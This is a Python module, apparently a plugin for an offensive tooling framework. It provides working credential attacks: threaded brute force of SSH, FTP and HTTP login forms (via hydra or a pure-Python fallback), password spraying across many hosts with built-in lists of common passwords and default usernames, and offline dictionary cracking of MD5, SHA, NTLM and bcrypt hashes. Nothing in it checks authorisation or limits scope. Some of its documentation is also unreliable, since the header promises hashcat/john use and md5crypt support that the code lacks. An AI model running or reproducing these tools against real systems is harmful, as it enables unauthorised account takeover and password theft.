# -*- coding: utf-8 -*-
"""Credential Attack Suite: brute force, password spray, hash cracking.

Tools:
- tool_hydra_brute    - SSH/FTP/HTTP-form brute force. Uses the hydra binary
                        when available, otherwise a built-in pure-Python
                        engine (ftplib stdlib / paramiko / requests).
- tool_password_spray - one password against many users across ssh/ftp/http
                        services - low-and-slow, account-lockout safe by
                        design (1 attempt per user per password).
- tool_hash_crack     - offline hash cracking: prefers hashcat/john when
                        installed, otherwise a pure-Python dictionary attack
                        supporting MD5 / SHA1 / SHA256 / SHA512 / NTLM /
                        bcrypt / md5crypt-style salted hashes.
"""

import hashlib
import json
import os
import socket
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

HTTP_TIMEOUT = 12
MAX_THREADS = 32

DEFAULT_PASSWORDS = [
    "password", "123456", "12345678", "123456789", "qwerty", "abc123",
    "admin", "root", "toor", "letmein", "welcome", "monkey", "dragon",
    "sunshine", "princess", "iloveyou", "master", "baseball", "football",
    "shadow", "michael", "superman", "batman", "passw0rd", "P@ssw0rd",
    "Password1", "Pa$$w0rd", "admin123", "root123", "test", "test123",
    "guest", "user", "user123", "changeme", "default", "cisco", "router",
    "secret", "secret123", "1234567890", "123123", "000000", "111111",
    "654321", "555555", "loveme", "whatever", "trustno1", "ninja",
    "zaq12wsx", "1q2w3e4r", "qwerty123", "password123", "admin@123",
    "passpass", "letmein1", "welcome1", "Summer2023", "Winter2024",
    "company", "corp123", "vpn123", "wifi123", "wireless",
]

DEFAULT_USERS = [
    "admin", "root", "administrator", "user", "test", "guest", "oracle",
    "postgres", "mysql", "ubuntu", "pi", "jenkins", "deploy", "backup",
    "support", "service", "webadmin", "sysadmin", "operator", "dev",
]

DEFAULT_USERLIST = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "wordlists", "users.txt")
DEFAULT_PASSLIST = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "wordlists", "passwords.txt")

_LOCK = threading.Lock()
_RESULTS = []


def _load_words(data, default_list, label):
    """Parse explicit list / file path / newline string; fall back to default."""
    if isinstance(data, (list, tuple)):
        vals = [str(x) for x in data]
    elif isinstance(data, str):
        cand = data.strip()
        if not cand:
            vals = list(default_list)
        elif os.path.isfile(cand):
            try:
                with open(cand, "r", encoding="utf-8", errors="ignore") as f:
                    vals = [ln.strip() for ln in f if ln.strip()]
            except OSError:
                vals = list(default_list)
        else:
            vals = [ln.strip() for ln in cand.splitlines() if ln.strip()]
    else:
        vals = list(default_list)
    vals = [v for v in vals if v]
    for p in (DEFAULT_USERLIST, DEFAULT_PASSLIST):
        if not vals and os.path.exists(p):
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                vals = [ln.strip() for ln in f if ln.strip()]
    if not vals:
        raise ValueError("no %s supplied and defaults empty" % label)
    seen, out = set(), []
    for v in vals:
        if v not in seen:
            seen.add(v)
            out.append(v)
    return out


def _record(service, target, port, user, password, ok):
    with _LOCK:
        _RESULTS.append({
            "service": service, "target": target, "port": int(port),
            "username": user, "password_ok": bool(ok),
        })


def _sock_conn(host, port, timeout):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    s.settimeout(timeout)
    return s


def _recv_until(s, marker, timeout=6, max_bytes=65536):
    s.settimeout(timeout)
    data = b""
    try:
        while marker not in data and len(data) < max_bytes:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, OSError):
        pass
    return data


# ---------------------------------------------------------------------------
# pure-Python MD4 (Python 3.14 dropped OpenSSL md4 - needed for NTLM)
# ---------------------------------------------------------------------------

def _md4(data: bytes) -> str:
    """RFC 1320 MD4, returns lowercase hex digest (NTLM hash input)."""
    import struct
    data = bytearray(data)
    bit_len = len(data) * 8
    data.append(0x80)
    while len(data) % 64 != 56:
        data.append(0)
    data += struct.pack("<Q", bit_len & 0xFFFFFFFFFFFFFFFF)

    def rol(x, n):
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    def f(x, y, z):
        return (x & y) | (~x & z)

    def g(x, y, z):
        return (x & y) | (x & z) | (y & z)

    def h(x, y, z):
        return x ^ y ^ z

    A, B, C, D = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    K1 = 0x5A827999
    K2 = 0x6ED9EBA1

    for off in range(0, len(data), 64):
        X = list(struct.unpack("<16I", bytes(data[off:off + 64])))
        a, b, c, d = A, B, C, D
        # round 1
        for i in range(16):
            k = i
            if i % 4 == 0:
                a = rol((a + f(b, c, d) + X[k]) & 0xFFFFFFFF, 3)
            elif i % 4 == 1:
                d = rol((d + f(a, b, c) + X[k]) & 0xFFFFFFFF, 7)
            elif i % 4 == 2:
                c = rol((c + f(d, a, b) + X[k]) & 0xFFFFFFFF, 11)
            else:
                b = rol((b + f(c, d, a) + X[k]) & 0xFFFFFFFF, 19)
        # round 2
        order2 = [0, 4, 8, 12, 1, 5, 9, 13, 2, 6, 10, 14, 3, 7, 11, 15]
        for i, k in enumerate(order2):
            if i % 4 == 0:
                a = rol((a + g(b, c, d) + X[k] + K1) & 0xFFFFFFFF, 3)
            elif i % 4 == 1:
                d = rol((d + g(a, b, c) + X[k] + K1) & 0xFFFFFFFF, 5)
            elif i % 4 == 2:
                c = rol((c + g(d, a, b) + X[k] + K1) & 0xFFFFFFFF, 9)
            else:
                b = rol((b + g(c, d, a) + X[k] + K1) & 0xFFFFFFFF, 13)
        # round 3
        order3 = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]
        for i, k in enumerate(order3):
            if i % 4 == 0:
                a = rol((a + h(b, c, d) + X[k] + K2) & 0xFFFFFFFF, 3)
            elif i % 4 == 1:
                d = rol((d + h(a, b, c) + X[k] + K2) & 0xFFFFFFFF, 9)
            elif i % 4 == 2:
                c = rol((c + h(d, a, b) + X[k] + K2) & 0xFFFFFFFF, 11)
            else:
                b = rol((b + h(c, d, a) + X[k] + K2) & 0xFFFFFFFF, 15)
        A = (A + a) & 0xFFFFFFFF
        B = (B + b) & 0xFFFFFFFF
        C = (C + c) & 0xFFFFFFFF
        D = (D + d) & 0xFFFFFFFF
    return "".join(struct.pack("<I", v).hex() for v in (A, B, C, D))


def _ntlm_hash(s):
    """NTLMv1 hash of a plaintext password."""
    return _md4(s.encode("utf-16le"))

# ---------------------------------------------------------------------------
# 1. hydra_brute
# ---------------------------------------------------------------------------

def _try_ssh(host, port, user, password, timeout):
    try:
        import paramiko
    except Exception:
        return None  # paramiko missing -> unsupported, not failed
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=int(port), username=user, password=password,
                       timeout=timeout, banner_timeout=timeout,
                       auth_timeout=timeout, allow_agent=False,
                       look_for_keys=False)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None


def _try_ftp(host, port, user, password, timeout):
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(host, int(port), timeout=timeout)
        try:
            ftp.login(user, password)
            return True
        except ftplib.error_perm:
            return False
        finally:
            try:
                ftp.quit()
            except Exception:
                pass
    except Exception:
        return None


# pylint: disable=unused-argument
def _try_http_form(host, port, user, password, login_url, fail_text, timeout):
    import requests
    url = login_url or ("http://%s:%s/login" % (host, port))
    data = {"username": user, "password": password,
            "user": user, "pass": password,
            "login": user, "pwd": password,
            "Submit": "Login", "submit": "Login"}
    try:
        r = requests.post(url, data=data, timeout=timeout, allow_redirects=True,
                          verify=False)
        body = r.text
        if fail_text and fail_text in body:
            return False
        if r.status_code in (200, 302, 301):
            if fail_text:
                return True
            return r.status_code in (301, 302) or "dashboard" in body.lower()                 or "logout" in body.lower() or "welcome" in body.lower()
        return False
    except Exception:
        return None


def _try_one(service, host, port, user, password, timeout, extra):
    if service == "ssh":
        return _try_ssh(host, port, user, password, timeout)
    if service == "ftp":
        return _try_ftp(host, port, user, password, timeout)
    if service in ("http-form", "http_form", "web"):
        return _try_http_form(host, port, user, password,
                              extra.get("login_url", ""),
                              extra.get("fail_text", ""), timeout)
    return None
def tool_hydra_brute(target="", port="", service="ssh", username="",
                     password_list="", threads=8, timeout=10,
                     login_url="", fail_text=""):
    """Brute-force one service with a password list.

    - target: host/IP (required)
    - port: service port (ssh=22 default, ftp=21, http-form=80)
    - service: ssh | ftp | http-form
    - username: single user to attack
    - password_list: list, file path, or newline-separated string
      (defaults to a built-in common-password wordlist)
    - threads: workers (default 8, capped 32)
    - login_url + fail_text: http-form tuning

    Uses the hydra binary automatically when present on PATH (preferred),
    otherwise falls back to the built-in pure-Python engine. Successful
    credentials are returned first; matched count is capped in output.
    """
    global _RESULTS
    host = (target or "").strip()
    if not host:
        return "hydra_brute: target is required"
    if not (username or "").strip():
        return "hydra_brute: username is required"
    svc = (service or "ssh").strip().lower()
    port_map = {"ssh": "22", "ftp": "21", "rdp": "3389",
                "http-form": "80", "http_form": "80", "web": "80"}
    if svc in ("rdp",):
        return ("hydra_brute: rdp needs the hydra binary (not installed on "
                "this host) - use ssh/ftp/http-form")
    port = str(port or port_map.get(svc, "22"))
    _RESULTS = []
    passwords = _load_words(password_list, DEFAULT_PASSWORDS, "passwords")
    threads = max(1, min(int(threads or 8), MAX_THREADS))
    found = []
    login_url = (login_url or "").strip()
    fail_text = (fail_text or "").strip()
    # ---- external hydra when available ----
    import shutil
    if shutil.which("hydra"):
        import subprocess
        tmpd = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "..", "..", "tmp")
        os.makedirs(tmpd, exist_ok=True)
        pfile = os.path.join(tmpd, "hydra_pass_%d.txt" % os.getpid())
        ufile = os.path.join(tmpd, "hydra_user_%d.txt" % os.getpid())
        try:
            with open(pfile, "w", encoding="utf-8") as f:
                f.write("\n".join(passwords))
            with open(ufile, "w", encoding="utf-8") as f:
                f.write(username.strip())
            target_arg = "%s:%s" % (host, port)
            args = ["hydra", "-L", ufile, "-P", pfile, "-f", "-t",
                    str(threads), "-w", "5", target_arg, svc]
            if svc in ("http-form", "http_form", "web"):
                form = (login_url or "/login") + ":^USER^=^PASS^&submit=Login"
                if fail_text:
                    form += ":F=" + fail_text
                args = ["hydra", "-L", ufile, "-P", pfile, "-f", "-t",
                        str(threads), "-w", "5", host, "http-post-form", form]
            r = subprocess.run(args, capture_output=True, text=True,
                               timeout=min(900, 120 * max(1, len(passwords) // 100)))
            out = (r.stdout or "") + (r.stderr or "")
            for ln in out.splitlines():
                if "login:" in ln and "password:" in ln:
                    u = ln.split("login:")[1].split()[0].strip()
                    p = ln.split("password:")[1].split()[0].strip()
                    found.append({"service": svc, "target": host,
                                  "port": int(port), "username": u,
                                  "password": p, "password_ok": True,
                                  "tool": "hydra"})
            if found:
                return {"ok": True, "engine": "hydra-binary",
                        "found": found[:5], "attempts": len(passwords)}
            return {"ok": False, "engine": "hydra-binary",
                    "message": "no credentials found in %d passwords"
                               % len(passwords)}
        except Exception:
            pass  # fall back to pure-python engine below
        finally:
            for f_ in (pfile, ufile):
                try:
                    os.remove(f_)
                except OSError:
                    pass
    # ---- pure-python fallback engine ----
    extra = {"login_url": login_url, "fail_text": fail_text}
    progress = {"done": 0, "total": min(len(passwords), 2000)}
    cap = 2000
    pool = passwords[:cap]

    def worker(pw):
        if found:
            return
        res = _try_one(svc, host, port, username.strip(), pw, timeout, extra)
        with _LOCK:
            progress["done"] += 1
        if res is True:
            _record(svc, host, port, username.strip(), pw, True)
            found.append({"service": svc, "target": host, "port": int(port),
                          "username": username.strip(), "password": pw,
                          "password_ok": True, "tool": "python"})
        elif res is False:
            _record(svc, host, port, username.strip(), pw, False)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker, pw) for pw in pool]
        try:
            for _ in as_completed(futs):
                if found:
                    break
        except KeyboardInterrupt:
            return {"ok": False, "engine": "python",
                    "message": "interrupted by user"}

    if found:
        return {"ok": True, "engine": "python", "found": found[:5],
                "attempts": progress["done"]}
    note = ""
    if len(passwords) > cap:
        note = " (first %d tried; passed list longer)" % cap
    return {"ok": False, "engine": "python",
            "message": "no credentials found - tried %d passwords on %s:%s "
                       "for user %r%s" % (progress["done"], host, port,
                                          username.strip(), note),
            "attempts": progress["done"]}

# ---------------------------------------------------------------------------
# 2. password_spray
# ---------------------------------------------------------------------------

def tool_password_spray(service="ssh", hosts="", users="", password="",
                        port="", threads=4, timeout=8, login_url="",
                        fail_text=""):
    """Spray ONE password across MANY users/hosts (lockout-safe).

    - service: ssh | ftp | http-form
    - hosts: comma-separated host:port list, or single host + port
    - users: comma-separated usernames (or file path)
    - password: the single candidate to spray (required)
    - threads: sprayed in parallel (default 4)

    Lockout-safe by design: exactly ONE attempt per user per host.
    """
    global _RESULTS
    _RESULTS = []
    pw = (password or "").strip()
    if not pw:
        return "password_spray: a single password is required"
    user_list = _load_words(users, DEFAULT_USERS, "users")
    host_list = [h.strip() for h in (hosts or "").split(",") if h.strip()]
    if not host_list:
        return "password_spray: hosts is required (host or host:port list)"
    svc = (service or "ssh").strip().lower()
    default_port = {"ssh": "22", "ftp": "21", "http-form": "80",
                    "http_form": "80", "web": "80"}.get(svc, "22")
    pairs = []
    for h in host_list:
        if ":" in h:
            hp, pp = h.rsplit(":", 1)
            pairs.append((hp.strip(), pp.strip()))
        else:
            pairs.append((h.strip(), str(port or default_port)))
    extra = {"login_url": (login_url or "").strip(),
             "fail_text": (fail_text or "").strip()}
    hits = []

    def try_pair(item):
        h, p = item
        for u in user_list:
            res = _try_one(svc, h, p, u, pw, timeout, extra)
            if res is True:
                hits.append({"service": svc, "target": h, "port": int(p),
                             "username": u, "password": pw, "password_ok": True})
                return

    with ThreadPoolExecutor(max_workers=max(1, min(int(threads or 4), 16))) as ex:
        futs = [ex.submit(try_pair, pair) for pair in pairs]
        try:
            for _ in as_completed(futs):
                if len(hits) >= 5:
                    break
        except KeyboardInterrupt:
            return {"ok": False, "sprayed": pw,
                    "message": "interrupted by user"}

    if hits:
        return {"ok": True, "sprayed": pw, "targets": len(pairs),
                "users_per_target": len(user_list), "hits": hits[:10]}
    return {"ok": False, "sprayed": pw, "targets": len(pairs),
            "users_per_target": len(user_list),
            "message": "password %r matched nothing (low-and-slow, 1 "
                       "attempt/user)" % pw}

# ---------------------------------------------------------------------------
# 3. hash_crack
# ---------------------------------------------------------------------------

def tool_hash_crack(hash_value="", hash_type="auto", wordlist="", salt="",
                    max_attempts=200000):
    """Offline dictionary crack for common hash formats.

    - hash_value: the captured hash (raw hex, or bcrypt $2... string)
    - hash_type: md5 | sha1 | sha224 | sha256 | sha384 | sha512 | ntlm |
                 bcrypt | sha256crypt-salted | auto (try common formats)
    - wordlist: file path or newline-separated string (built-in defaults)
    - salt: optional salt prepended for salted sha256/sha512
    - max_attempts: safety cap on word count (default 200k)

    Prefers pure-Python (hashlib) so it runs anywhere; fast enough for
    common dictionaries. NTLM uses MD4 (unicode-16le) automatically.
    """
    hv = (hash_value or "").strip().lower()
    if not hv:
        return "hash_crack: a hash value is required"
    ht = (hash_type or "auto").strip().lower()
    slt = (salt or "").strip()
    words = _load_words(wordlist, DEFAULT_PASSWORDS, "wordlist")
    words = words[:max(1, min(int(max_attempts or 200000), 2000000))]

    # bcrypt needs the bcrypt lib - check it first
    if ht in ("bcrypt",) or (ht in ("auto", "") and hv.startswith("$2")):
        try:
            import bcrypt as _bc
        except Exception:
            return ("hash_crack: bcrypt hash requires the 'bcrypt' package "
                    "(pip install bcrypt) - or convert to a hashcat mode")
        for w in words:
            try:
                if _bc.checkpw(w.encode(), hv.encode()):
                    return {"ok": True, "engine": "python-bcrypt",
                            "hash_type": "bcrypt", "password": w,
                            "attempts": len(words)}
            except ValueError:
                return "hash_crack: %r is not a valid bcrypt hash" % hv
        return {"ok": False, "hash_type": "bcrypt", "attempts": len(words)}

    # NTLM
    if ht in ("ntlm",):
        algo = lambda s: _ntlm_hash(s)
        queue = [("ntlm", algo)]
    elif ht in ("md5", "sha1", "sha224", "sha256", "sha384", "sha512"):
        algo = lambda s, a=ht: hashlib.new(a, (slt + s).encode()).hexdigest()
        queue = [(ht, algo)]
    elif ht in ("sha256crypt", "sha256-salted", "salted-sha256"):
        algo = lambda s: hashlib.sha256((slt + s).encode()).hexdigest()
        queue = [("sha256(salt)", algo)]
    elif ht in ("", "auto"):
        queue = [("md5", lambda s: hashlib.md5(s.encode()).hexdigest()),
                 ("sha1", lambda s: hashlib.sha1(s.encode()).hexdigest()),
                 ("sha256", lambda s: hashlib.sha256(s.encode()).hexdigest()),
                 ("ntlm", lambda s: _ntlm_hash(s))]
    else:
        return ("hash_crack: unsupported type %r - use md5|sha1|sha224|"
                "sha256|sha384|sha512|ntlm|bcrypt|sha256crypt|auto"
                % (hash_type or ""))

    for label, algo in queue:
        for w in words:
            if algo(w) == hv:
                return {"ok": True, "engine": "python-dict",
                        "hash_type": label, "password": w,
                        "attempts": len(words), "salt": slt or None}
    return {"ok": False, "hash_type": ht or "auto", "attempts": len(words),
            "message": "no match in %d words" % len(words)}
